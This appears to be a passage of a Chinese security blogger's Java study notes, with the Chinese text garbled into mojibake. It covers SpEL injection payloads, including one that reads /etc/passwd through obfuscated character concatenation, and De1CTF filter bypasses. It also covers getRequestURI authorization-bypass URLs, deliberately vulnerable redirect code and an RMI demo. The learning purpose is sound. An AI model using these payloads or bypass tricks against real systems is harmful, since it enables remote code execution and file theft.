ScriptEngineManagerç±»ã€‚è·å–eval.#{T(String).getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;js&quot;).eval(&quot;java.la&quot;+&quot;ng.Run&quot;+&quot;time.getRun&quot;+&quot;time().ex&quot;+&quot;ec(&#39;calc.exe&#39;)&quot;)}//åå°„ ProcessBuilder,è¿›è¡Œå‘½ä»¤æ‰§è¡Œ#{(T(String).getClass().forName(&quot;java.la&quot;+&quot;ng.ProcessBuilder&quot;).getConstructor(&#39;foo&#39;.split(&#39;&#39;).getClass()).newInstance(new String[]{&#39;calc.exe&#39;})).start()}</code></pre><p>ç„¶åå°±æ˜¯ä¹‹å‰è§è¿‡çš„ç”¨åˆ°æ•°ç»„ç»•è¿‡çš„æ–¹æ³•æ„é€ çš„Nuxeo rceçš„payloadã€‚ç”¨äºbyoass getclass</p><pre><code class="java">#{&#39;&#39;[&#39;class&#39;].forName(&#39;java.lang.Runtime&#39;).getDeclaredMethods()[15].invoke(&#39;&#39;[&#39;class&#39;].forName(&#39;java.lang.Runtime&#39;).getDeclaredMethods()[7].invoke(null),&#39;calc.exe&#39;)}</code></pre><p>ä¸è¿‡è¿™ä¸ªpayloadå¥½åƒæµ‹è¯•æ—¶å°±æ²¡æˆåŠŸè¿‡ã€‚</p><p>ç„¶åè¿˜æœ‰ä¸€ç§bypasså¼•å·çš„æ–¹æ³•</p><pre><code class="java">${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}</code></pre><p>å³åˆ©ç”¨Tè¿ç®—ç¬¦è·å–åˆ°Charactorå†ç”¨toStringæ¥å¾—åˆ°å­—ç¬¦ã€‚</p><ul><li>De1CTF calc</li></ul><p>ä¸Šé¢çš„éƒ½æ˜¯å‘½ä»¤æ‰§è¡Œpayloadã€‚ç„¶è€Œå®é™…ä¸Šå¦‚æœé‡åˆ°De1è¿™é“é¢˜ï¼ŒopenraspæŠŠåº•å±‚çš„å‘½ä»¤æ‰§è¡Œéƒ½hookçš„æƒ…å†µ,å°±åªèƒ½ä»åˆ«çš„æ€è·¯ä¸‹æ‰‹äº†ã€‚(è™½ç„¶dalaoè¿˜æ˜¯RCEäº†,å¤ªå¼ºäº†)<br>é¢˜ç›®çš„è¿‡æ»¤å¤§è‡´å¦‚ä¸‹</p><pre><code>ProcessBuilderjava.langgetClassRuntimenewT(#</code></pre><p>å…ˆæ˜¯è¿™å±‚è¿‡æ»¤,ç„¶åæ‰æ˜¯openraspçš„ä¿æŠ¤ã€‚</p><p>è¿™é“é¢˜é¦–å…ˆå¦‚æœåˆ©ç”¨spelä¸åŒºåˆ†å…³é”®å­—å¤§å°å†™çš„ç‰¹æ€§,å¯ä»¥ç›´æ¥å¿½è§†<code>new</code>è¢«è¿‡æ»¤çš„æƒ…å†µè¯»æ–‡ä»¶</p><pre><code class="java">New java.io.BufferedReader(New java.io.FileReader(&quot;/flag&quot;)).readLine()</code></pre><p>ä¸è¿‡å¸ˆå‚…å¯¹äºè¿™äº›å…³é”®å­—çš„ç»•è¿‡ä¹Ÿæœ‰å…¶ä»–çš„åŠæ³•<br><a href="https://landgrey.me/blog/15/" target="_blank" rel="noopener">https://landgrey.me/blog/15/</a></p><p>æ¯”å¦‚å‰é¢çš„getClass(),é™¤äº†ç”¨æ•°ç»„ç»•è¿‡,è¿˜å¯ä»¥ç”¨<code>&#39;&#39;.class.getSuperclass().class</code>è·å–åˆ°</p><p>é™¤æ­¤ä»¥å¤–ï¼Œè¿˜FUZZå‡ºäº†<code>T%00(</code>å¯ä»¥ç»•è¿‡<code>T(</code>çš„wafçš„æ‰‹æ®µã€‚(è¿™æ˜¯åº•å±‚æºç çš„é—®é¢˜,è†œ)</p><p>è‡³äºdalaoè¾¾æˆRCEçš„æ€è·¯,æˆ‘è§‰å¾—ä¹Ÿéå¸¸å€¼å¾—å­¦ä¹ ã€‚å› ä¸ºæˆ‘ä»¬æƒ³è¦è¯»æ–‡ä»¶æˆ–è€…æ‰§è¡Œå‘½ä»¤çš„è¯,å¿…ç„¶æ˜¯è¦åˆ›å»ºä¸€ä¸ªå®ä¾‹çš„ã€‚è€ŒSpELæä¾›äº†T()ç”¨æ¥æŒ‡å®šä¸€ä¸ªå®ä¾‹,è¿™æ˜¯ä¸€ç§æ€è·¯ã€‚é™¤æ­¤ä»¥å¤–å°±æ˜¯ä½¿ç”¨javaä»£ç æ¥å®ä¾‹åŒ–ã€‚é™¤äº†newä»¥å¤–,åƒååºåˆ—åŒ–è¿™ç§æ–¹å¼ä¹Ÿæ˜¯å¯ä»¥åˆ›å»ºå®ä¾‹çš„ã€‚æ‰€ä»¥ä½¿ç”¨<code>T(org.springframework.util.SerializationUtils).deserialize(T(com.sun.org.apache.xml.internal.security.utils.Base64).decode(&#39;rO0AB...&#39;))</code>è¿™ç§é™æ€æ–¹æ³•å®Œå…¨å¯ä»¥ã€‚<br>é™¤æ­¤ä¹‹å¤–å°±æ˜¯è¦æŠŠæ¶æ„ä»£ç å†™åœ¨é»˜è®¤çš„ç±»æ„é€ å™¨ä¸­ï¼Œå°±ä¸éœ€è¦æ˜¾ç¤ºçš„å®ä¾‹åŒ–ç±»ï¼Œä¹Ÿèƒ½æ‰§è¡Œä»£ç äº†ã€‚</p><p>å¦‚æœä»¥åé‡åˆ°å¯¹åº”çš„é—®é¢˜ä¸€å®šä¼šå»ä»”ç»†ç ”ç©¶ä¸‹ã€‚</p><h3 id="url-security-issues"><a href="#url-security-issues" class="headerlink" title="url security issues"></a>url security issues</h3><p>ä»Šå¤©æ¥å°±å‡ ä¸ªurlçš„é—®é¢˜ç¨å¾®ç ”ç©¶ä¸‹ã€‚</p><ul><li>GetRequestURI</li></ul><p>GetRequestURI.java</p><pre><code class="java">package org.joychou.controller;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import org.springframework.util.AntPathMatcher;import org.springframework.util.PathMatcher;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;import javax.servlet.http.HttpServletRequest;/** * The difference between getRequestURI and getServletPath. * ç”±äºSpring Securityçš„&lt;code&gt;antMatchers(&quot;/css/**&quot;, &quot;/js/**&quot;)&lt;/code&gt;æœªä½¿ç”¨getRequestURIï¼Œæ‰€ä»¥ç™»å½•ä¸ä¼šè¢«ç»•è¿‡ã€‚ * &lt;p&gt; * Details: https://joychou.org/web/security-of-getRequestURI.html * &lt;p&gt; * Poc: * http://localhost:8080/css/%2e%2e/exclued/vuln * http://localhost:8080/css/..;/exclued/vuln * http://localhost:8080/css/..;bypasswaf/exclued/vuln * * @author JoyChou @2020-03-28 */@RestController@RequestMapping(&quot;uri&quot;)public class GetRequestURI {    private final Logger logger = LoggerFactory.getLogger(this.getClass());    @GetMapping(value = &quot;/exclued/vuln&quot;)    public String exclued(HttpServletRequest request) {        String[] excluedPath = {&quot;/css/**&quot;, &quot;/js/**&quot;};        String uri = request.getRequestURI(); // Security: request.getServletPath()        PathMatcher matcher = new AntPathMatcher();        logger.info(&quot;getRequestURI: &quot; + uri);        logger.info(&quot;getServletPath: &quot; + request.getServletPath());        for (String path : excluedPath) {            if (matcher.match(path, uri)) {                return &quot;You have bypassed the login page.&quot;;            }        }        return &quot;This is a login page &gt;..&lt;&quot;;    }}</code></pre><p>geteRequestURIå®é™…ä¸Šæ˜¯HttpServletRequestä¸­å‡ ä¸ªè§£æURLçš„å‡½æ•°ä¸­çš„ä¸€ç§ã€‚å®ƒä¼šè¿”å›é™¤å»Hostï¼ˆåŸŸåæˆ–IPï¼‰éƒ¨åˆ†çš„è·¯å¾„ã€‚è¿™é‡Œæˆ‘ä»¬æœ¬åœ°æ¥èµ·ä¸ªé¡¹ç›®è·‘ä¸€ä¸‹ã€‚<br>æŒ‰ç…§Mi1k7eaåšå®¢ä¸­çš„jspæ›¿æ¢index.jsp  (<a href="https://xz.aliyun.com/t/7544" target="_blank" rel="noopener">https://xz.aliyun.com/t/7544</a>)</p><pre><code class="java">&lt;%  out.println(&quot;getRequestURL(): &quot; + request.getRequestURL() + &quot;&lt;br&gt;&quot;);  out.println(&quot;getRequestURI(): &quot; + request.getRequestURI() + &quot;&lt;br&gt;&quot;);  out.println(&quot;getContextPath(): &quot; + request.getContextPath() + &quot;&lt;br&gt;&quot;);  out.println(&quot;getServletPath(): &quot; + request.getServletPath() + &quot;&lt;br&gt;&quot;);  out.println(&quot;getPathInfo(): &quot; + request.getPathInfo() + &quot;&lt;br&gt;&quot;);%&gt;</code></pre><p>èµ·ä¸€ä¸ªtomcatçš„è¯,è¦åœ¨Run=&gt;EditConfiguration å·¦è¾¹+å·æ·»åŠ ä¸€ä¸ªlocal tomcat serverã€‚å¹¶å°†é¡¹ç›®è·¯å¾„é…ç½®å¥½ã€‚æˆ‘è¿™é‡Œé…ç½®çš„æ ¹ç›®å½•æ˜¯java_sec_web.</p><p>æ¥ç€æ¥å®éªŒã€‚ä¸€ä¸‹å‡ ç§å½¢å¼çš„è®¿é—®éƒ½å¯ä»¥è®¿é—®åˆ°index.jsp</p><pre><code>http://localhost:8080/java_sec_web/index.jsphttp://localhost:8080/java_sec_web/./././././index.jsphttp://localhost:8080/java_sec_web/totally_not_matter/../index.jsp</code></pre><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/14.PNG" class="lazyload" data-srcset="14.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ç‰¹åˆ«çš„,ä½¿ç”¨<code>;a/;bb/;ccc/index.jsp</code>ä¹Ÿå¯ä»¥è®¿é—®åˆ°ã€‚</p><p>ä»è¿™é‡Œæˆ‘ä»¬å°±èƒ½å‘ç°ã€‚ä½¿ç”¨getRequestURIä¼¼ä¹å°±æ˜¯ç›´æ¥è¿”å›æˆ‘ä»¬è¯·æ±‚è·¯å¾„hoståé¢çš„éƒ¨åˆ†ã€‚å®é™…ä¸Šåº•å±‚æºç ä¹Ÿç¡®å®æ˜¯è¿™ä¹ˆå†™çš„ã€‚æ—¢ç„¶å¦‚æ­¤å°±å¯ä»¥å¯¼è‡´æŸäº›åˆ©ç”¨urlbypassçš„æ”»å‡»ã€‚</p><p>æ¯”å¦‚è¯´,<code>/java_sec_web/info</code>è·¯å¾„ä¸‹å­˜åœ¨ä¸€ä¸ªsecret.jspå®ƒé€šè¿‡å¦‚ä¸‹ä»£ç æ¥é™åˆ¶æ²¡æœ‰æƒé™çš„äººè®¿é—®</p><pre><code class="java"> HttpServletRequest httpServletRequest = (HttpServletRequest)servletRequest;HttpServletResponse httpServletResponse =(HttpServletResponse)servletResponse;String url = httpServletRequest.getRequestURI();if (url.startsWith(&quot;/urltest/info&quot;)) {    httpServletResponse.getWriter().write(&quot;No Permission.&quot;);    return;}</code></pre><p>ä½†æ˜¯å¦‚ä¸‹è·¯å¾„åˆ™å¯ä»¥è½»æ¾bypass</p><pre><code>http://localhost:8080/java_sec_web/./info/secret.jsphttp://localhost:8080/java_sec_web/;233333/info/secret.jsphttp://localhost:8080/java_sec_web/32112323/../info/secret.jsp</code></pre><p>å›åˆ°é¡¹ç›®ä¸Šæ¥ã€‚æˆ‘ä»¬å°±å¯ä»¥ç”¨åŒæ ·çš„é“ç†è¿›è¡Œæƒé™ç»•è¿‡äº†ã€‚è¿™é‡Œç»™å‡ºçš„pathæ˜¯cssä¸jsè¿™æ ·çš„é™æ€ç›®å½•ã€‚<code>String[] excluedPath = {&quot;/css/**&quot;, &quot;/js/**&quot;};</code>æˆ‘ä»¬åŒæ ·å¯ä»¥é€šè¿‡å‡ ç§æ–¹å¼è®¿é—®ã€‚</p><p>æ‰€ä»¥å®‰å…¨çš„è§£å†³æ–¹æ¡ˆé€šå¸¸æ˜¯ä½¿ç”¨<code>getPathInfo()</code>æˆ–è€…<code>getServletPath()</code>æ¥æ›¿æ¢<code>getRequestURI()</code></p><p>ä»Šå¹´çš„ä¸€ä¸ªshiroCVEå°±æ˜¯è¿™ä¸ªæˆå› ã€‚å› ä¸ºæ‹¦æˆªå™¨å†™çš„æ—¶å€™æ‹¦æˆªäº†<code>/abc/*</code>è¿™æ ·çš„æ­£åˆ™ã€‚è€Œä½¿ç”¨<code>/abc/1/</code>æ—¶ï¼Œshiroçš„æ‹¦æˆªå™¨æ²¡æœ‰æ‹¦æˆªåˆ°ã€‚ä½†æ˜¯getRequestURIå´è®©æˆ‘ä»¬æ­£å¸¸è®¿é—®åˆ°äº†ã€‚å¯¼è‡´äº†æƒé™ç»•è¿‡ã€‚</p><ul><li>urlè§£æ</li></ul><p>è·Ÿå­¦ä¹ ssrfæ—¶é‡Œé¢å‡ºç°çš„bypass url hosté™åˆ¶æ˜¯ä¸€ä¸ªç±»å‹ã€‚å› ä¸ºæœ‰ç°æˆçš„è§£é‡Šå°±ä¸å¤šä½œè¯´æ˜äº†<a href="https://github.com/JoyChou93/java-sec-code/wiki/URL-whtielist-Bypass" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code/wiki/URL-whtielist-Bypass</a></p><p>åŸºæœ¬ä¸Šè¿˜æ˜¯é€šè¿‡<code>#</code>,<code>;</code>ç­‰ç­‰æ¥è¿›è¡Œurlbypassç»•è¿‡gethostã€‚</p><ul><li>302è°ƒè½¬</li></ul><pre><code class="java">package org.joychou.controller;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.bind.annotation.ResponseBody;import javax.servlet.RequestDispatcher;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import org.joychou.security.SecurityUtil;/** * The vulnerability code and security code of Java url redirect. * The security code is checking whitelist of url redirect. * * @author JoyChou (joychou@joychou.org) * @version 2017.12.28 */@Controller@RequestMapping(&quot;/urlRedirect&quot;)public class URLRedirect {    /**     * http://localhost:8080/urlRedirect/redirect?url=http://www.baidu.com     */    @GetMapping(&quot;/redirect&quot;)    public String redirect(@RequestParam(&quot;url&quot;) String url) {        return &quot;redirect:&quot; + url;    }    /**     * http://localhost:8080/urlRedirect/setHeader?url=http://www.baidu.com     */    @RequestMapping(&quot;/setHeader&quot;)    @ResponseBody    public static void setHeader(HttpServletRequest request, HttpServletResponse response) {        String url = request.getParameter(&quot;url&quot;);        response.setStatus(HttpServletResponse.SC_MOVED_PERMANENTLY); // 301 redirect        response.setHeader(&quot;Location&quot;, url);    }    /**     * http://localhost:8080/urlRedirect/sendRedirect?url=http://www.baidu.com     */    @RequestMapping(&quot;/sendRedirect&quot;)    @ResponseBody    public static void sendRedirect(HttpServletRequest request, HttpServletResponse response) throws IOException {        String url = request.getParameter(&quot;url&quot;);        response.sendRedirect(url); // 302 redirect    }    /**     * Safe code. Because it can only jump according to the path, it cannot jump according to other urls.     * http://localhost:8080/urlRedirect/forward?url=/urlRedirect/test     */    @RequestMapping(&quot;/forward&quot;)    @ResponseBody    public static void forward(HttpServletRequest request, HttpServletResponse response) {        String url = request.getParameter(&quot;url&quot;);        RequestDispatcher rd = request.getRequestDispatcher(url);        try {            rd.forward(request, response);        } catch (Exception e) {            e.printStackTrace();        }    }    /**     * Safe code of sendRedirect.     * http://localhost:8080/urlRedirect/sendRedirect/sec?url=http://www.baidu.com     */    @RequestMapping(&quot;/sendRedirect/sec&quot;)    @ResponseBody    public void sendRedirect_seccode(HttpServletRequest request, HttpServletResponse response)            throws IOException {        String url = request.getParameter(&quot;url&quot;);        if (SecurityUtil.checkURL(url) == null) {            response.setStatus(HttpServletResponse.SC_FORBIDDEN);            response.getWriter().write(&quot;url forbidden&quot;);            return;        }        response.sendRedirect(url);    }}</code></pre><p>è¿™ä¸€éƒ¨åˆ†æ›´å¤šæ˜¯å®‰å…¨ç¼–ç¨‹çš„é—®é¢˜ã€‚å¦‚æœé‡å®šå‘å‡ºç°é—®é¢˜å°±å¾ˆæœ‰å¯èƒ½ä¼šä¸xssç­‰æ¼æ´è”ç³»èµ·æ¥ã€‚æ­¤å¤„æ¶æ„ä»£ç ä¸­,ä»»æ„urléƒ½å¯ä»¥é€šè¿‡<code>setHeader</code>,<code>sendRedirect</code>å¯¼è‡´é‡å®šå‘ã€‚é™åˆ¶æ–¹æ³•åˆ™å¦‚æœ€åä¸¤ä¸ªè§£å†³æªæ–½,é™åˆ¶åªèƒ½åœ¨pathé—´è°ƒè½¬æˆ–è€…ç›´æ¥å†™å¥½<code>SecurityUtil</code>æ¥é™åˆ¶è°ƒè½¬çš„url.</p><h3 id="java-rmi"><a href="#java-rmi" class="headerlink" title="java-rmi"></a>java-rmi</h3><p>  æœ€æ—©æ¥è§¦åˆ°rmiæ˜¯åœ¨å¤ç°vulhubä¸Šfastjsonæ¼æ´æ—¶å­¦åˆ°çš„,ä½¿ç”¨jndiæ³¨å…¥æ—¶ç”¨åˆ°<code>rmi://</code>æˆ–<code>jndi://</code>ã€‚ç°åœ¨æ¥å­¦ä¹ ä¸‹rmiçš„å…·ä½“ä½¿ç”¨ï¼Œ</p><blockquote><p>RMIï¼ˆRemote Method Invocationï¼‰å³è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œæ˜¯åˆ†å¸ƒå¼ç¼–ç¨‹ä¸­çš„ä¸€ä¸ªåŸºæœ¬æ€æƒ³ã€‚<br> Java RMIæ˜¯ä¸“ä¸ºJavaç¯å¢ƒè®¾è®¡çš„è¿œç¨‹æ–¹æ³•è°ƒç”¨æœºåˆ¶ï¼Œæ˜¯ä¸€ç§ç”¨äºå®ç°è¿œç¨‹è°ƒç”¨ï¼ˆRPCï¼ŒRemote Procedure Callï¼‰çš„Java APIï¼Œèƒ½ç›´æ¥ä¼ è¾“åºåˆ—åŒ–åçš„Javaå¯¹è±¡å’Œåˆ†å¸ƒå¼åƒåœ¾æ”¶é›†ã€‚å®ƒçš„å®ç°ä¾èµ–äºJVMï¼Œå› æ­¤å®ƒæ”¯æŒä»ä¸€ä¸ªJVMåˆ°å¦ä¸€ä¸ªJVMçš„è°ƒç”¨ã€‚<br>åœ¨Java RMIä¸­ï¼Œè¿œç¨‹æœåŠ¡å™¨å®ç°å…·ä½“çš„Javaæ–¹æ³•å¹¶æä¾›æ¥å£ï¼Œå®¢æˆ·ç«¯æœ¬åœ°ä»…éœ€æ ¹æ®æ¥å£ç±»çš„å®šä¹‰ï¼Œæä¾›ç›¸åº”çš„å‚æ•°å³å¯è°ƒç”¨è¿œç¨‹æ–¹æ³•ï¼Œå…¶ä¸­å¯¹è±¡æ˜¯é€šè¿‡åºåˆ—åŒ–æ–¹å¼è¿›è¡Œç¼–ç ä¼ è¾“çš„ã€‚</p></blockquote><ul><li>design-pattern</li></ul><p>è®¾è®¡æ¨¡å¼åŒ…å«ä¸‰ä¸ªéƒ¨åˆ†ï¼š<br>1.Registryã€‚Serverç«¯å‘Registryæ³¨å†ŒæœåŠ¡,Clientç«¯ä»Registryè·å–è¿œç¨‹å¯¹è±¡çš„ä¸€äº›ä¿¡æ¯å¹¶è¿›è¡Œè°ƒç”¨ã€‚<br>2.Server æä¾›è¿œç¨‹æ–¹æ³•<br>3.Client ä½¿ç”¨è¿œç¨‹æ–¹æ³•</p><ul><li>interaction</li></ul><blockquote><p>1.é¦–å…ˆï¼Œå¯åŠ¨RMI RegistryæœåŠ¡ï¼Œå¯åŠ¨æ—¶å¯ä»¥æŒ‡å®šæœåŠ¡ç›‘å¬çš„ç«¯å£ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨é»˜è®¤çš„ç«¯å£ï¼ˆ1099ï¼‰<br>2.å…¶æ¬¡ï¼ŒServerç«¯åœ¨æœ¬åœ°å…ˆå®ä¾‹åŒ–ä¸€ä¸ªæä¾›æœåŠ¡çš„å®ç°ç±»ï¼Œç„¶åé€šè¿‡RMIæä¾›çš„Naming/Context/Registryç­‰ç±»çš„bindæˆ–rebindæ–¹æ³•å°†åˆšæ‰å®ä¾‹åŒ–å¥½çš„å®ç°ç±»æ³¨å†Œåˆ°RMI Registryä¸Šå¹¶å¯¹å¤–æš´éœ²ä¸€ä¸ªåç§°<br>3.æœ€åï¼ŒClientç«¯é€šè¿‡æœ¬åœ°çš„æ¥å£å’Œä¸€ä¸ªå·²çŸ¥çš„åç§°ï¼ˆå³RMI Registryæš´éœ²å‡ºçš„åç§°ï¼‰ï¼Œä½¿ç”¨RMIæä¾›çš„Naming/Context/Registryç­‰ç±»çš„lookupæ–¹æ³•ä»RMI Serviceé‚£æ‹¿åˆ°å®ç°ç±»ã€‚è¿™æ ·è™½ç„¶æœ¬åœ°æ²¡æœ‰è¿™ä¸ªç±»çš„å®ç°ç±»ï¼Œä½†æ‰€æœ‰çš„æ–¹æ³•éƒ½åœ¨æ¥å£é‡Œäº†ï¼Œä¾¿å¯ä»¥å®ç°è¿œç¨‹è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•</p></blockquote><ul><li>dynamic class loading</li></ul><p>ä¸€ä¸ªéå¸¸é‡è¦çš„ç‚¹ã€‚rmiæ”¯æŒæˆ‘ä»¬åœ¨æ²¡æœ‰æŸä¸ªç±»å®šä¹‰æ—¶å‰å»ä¸‹è½½è¿œç¨‹ç±»ã€‚è¿™ä¹Ÿæ˜¯jndiä¸ååºåˆ—åŒ–åº”ç”¨çš„ä¸»è¦æ‰‹æ®µã€‚åŠ¨æ€åŠ è½½çš„å¯¹è±¡classæ–‡ä»¶å¯ä»¥ä½¿ç”¨WebæœåŠ¡çš„æ–¹å¼è¿›è¡Œæ‰˜ç®¡ã€‚è¿™å¯ä»¥åŠ¨æ€çš„æ‰©å±•è¿œç¨‹åº”ç”¨çš„åŠŸèƒ½ï¼ŒRMIæ³¨å†Œè¡¨ä¸Šå¯ä»¥åŠ¨æ€çš„åŠ è½½ç»‘å®šå¤šä¸ªRMIåº”ç”¨ã€‚å®¢æˆ·ç«¯ä½¿ç”¨äº†ä¸RMIæ³¨å†Œè¡¨ç›¸åŒçš„æœºåˆ¶ã€‚RMIæœåŠ¡ç«¯å°†URLä¼ é€’ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯é€šè¿‡HTTPè¯·æ±‚ä¸‹è½½è¿™äº›ç±»ã€‚åŒæ ·å®ç°äº†åŠ¨æ€åŠ è½½ã€‚</p><ul><li>coding</li></ul><p>ä¸‹é¢æ¥å†™ä¸ªdemoã€‚è¿˜æ˜¯æŒ‰ç…§mi1k7eaå¸ˆå‚…çš„å®ä¾‹å†™æ³•å†™ä¸‹ã€‚</p><p>æœåŠ¡ç«¯è¿œç¨‹è°ƒç”¨çš„ç±»Identity</p><pre><code class="java">import java.io.Serializable;public class Identity implements Serializable{    private int id;    private String name;    private int age;    public int getId() {        return id;    }    public void setId(int id) {        this.id = id;    }    public String getName() {        return name;    }    public void setName(String name) {        this.name = name;    }    public int getAge() {        return age;    }    public void setAge(int age) {        this.age = age;    }}</code></pre><p>å› ä¸ºé¡¾åŠåˆ°å¼€å‘ä¹ æƒ¯,æ‰€ä»¥æˆå‘˜å˜é‡éƒ½æ˜¯ç§æœ‰çš„ã€‚è‡ªç„¶è°ƒç”¨æ—¶ä¹Ÿè¦æœ‰å¯¹åº”çš„setter,getteræ–¹æ³•ã€‚ideaæ”¯æŒç›´æ¥alt+enteræ·»åŠ é€‰ä¸­å±æ€§çš„setterå’Œgetteræ–¹æ³•ã€‚</p><p>ç„¶åæ˜¯ä¸€ä¸ªè¿œç¨‹æ¥å£ï¼ŒServiceImpl.class</p><pre><code class="java">import java.rmi.Remote;import java.rmi.RemoteException;import java.util.List;public interface Service extends Remote{    public List&lt;Identity&gt; GetList() throws RemoteException;}</code></pre><p>è¿œç¨‹æ¥å£å¿…é¡»ç»§æ‰¿java.rmi.Remoteæ¥å£ï¼Œä¸”æŠ›å‡ºRemoteExceptioné”™è¯¯<br>ç„¶åæ˜¯æ¥å£çš„å®ç°ç±»</p><pre><code class="java">import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;import java.util.LinkedList;import java.util.List;public class ServiceImpl extends UnicastRemoteObject implements Service{    public ServiceImpl() throws RemoteException {        super();    }    @Override    public List&lt;Identity&gt; GetList() throws RemoteException {        System.out.println(&quot;Get Identity Start!&quot;);        List&lt;Identity&gt; personlist =new LinkedList&lt;Identity&gt;();        Identity person1 = new Identity();        person1.setId(0);        person1.setName(&quot;byc&quot;);        person1.setAge(20);        personlist.add(person1);        Identity person2 = new Identity();        person2.setId(1);        person2.setName(&quot;Joe&quot;);        person2.setAge(18);        personlist.add(person2);        return personlist;    }}</code></pre><p>æ³¨æ„è¿™é‡Œæ„é€ æ–¹æ³•ä¹Ÿè¦throw  RemoteException.ç„¶åç±»å»ºå®Œåå¼€å§‹ä¼šæŠ¥é”™è¯´æˆ‘ä»¬æ²¡æœ‰å®ç°GetList()æ–¹æ³•ã€‚è¿™é‡Œç›´æ¥ç‚¹åˆ°æŠ¥é”™çš„ä½ç½®,å®ƒä¼šè‡ªåŠ¨æä¾›æˆ‘ä»¬ä¸€ä¸ªé‡å†™çš„GetList()æ–¹æ³•</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªæŠŠServerå’ŒRegistryçš„åˆ›å»ºã€å¯¹è±¡ç»‘å®šæ³¨å†Œè¡¨å†™åˆ°ä¸€å—çš„Programä»£ç </p><pre><code class="java">import java.rmi.Naming;import java.rmi.registry.LocateRegistry;public class Program {    public static void main(String[] args) {        try {            Service personService =new ServiceImpl();            LocateRegistry.createRegistry(6666);            Naming.rebind(&quot;rmi://127.0.0.1:6666/PersonService&quot;, personService);            System.out.println(&quot;Service Start!&quot;);        } catch (Exception e ) {            e.printStackTrace();        }    }}</code></pre><p>å®¢æˆ·ç«¯é€šè¿‡Naming.lookup()æ¥æŸ¥æ‰¾RMI Serverç«¯çš„è¿œç¨‹å¯¹è±¡å¹¶è·å–åˆ°æœ¬åœ°å®¢æˆ·ç«¯ç¯å¢ƒä¸­è¾“å‡ºå‡ºæ¥</p><pre><code class="java">import java.rmi.Naming;import java.util.List;public class Client {    public static void main(String[] args) {        try {            Service personService =(Service) Naming.lookup(&quot;rmi://127.0.0.1:6666/PersonService&quot;);            List&lt;Identity&gt; personList=personService.GetList();            for(Identity person:personList){                System.out.println(&quot;ID:&quot;+person.getId()+&quot; Age:&quot;+person.getAge()+&quot; Name:&quot;+person.getName());            }        } catch (Exception ex){            ex.printStackTrace();        }    }}</code></pre><p>åŒæ ·æ˜¯ä½¿ç”¨ctrl+alt+tæ·»åŠ try catchè¯­å¥ç¯ç»•ä¸­é—´rmiéƒ¨åˆ†è¯­å¥ã€‚<br>å…ˆå¯åŠ¨rmiserver.ç„¶åå®¢æˆ·ç«¯è°ƒç”¨æ–¹æ³•ã€‚<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/16.PNG" class="lazyload" data-srcset="16.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/17.PNG" class="lazyload" data-srcset="17.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å‡ ä¸ªå‡½æ•°çš„ä½¿ç”¨</p><pre><code class="java">bind(String name, Object obj)ï¼šæ³¨å†Œå¯¹è±¡ï¼ŒæŠŠå¯¹è±¡å’Œä¸€ä¸ªåå­—nameç»‘å®šrebind(String name, Object 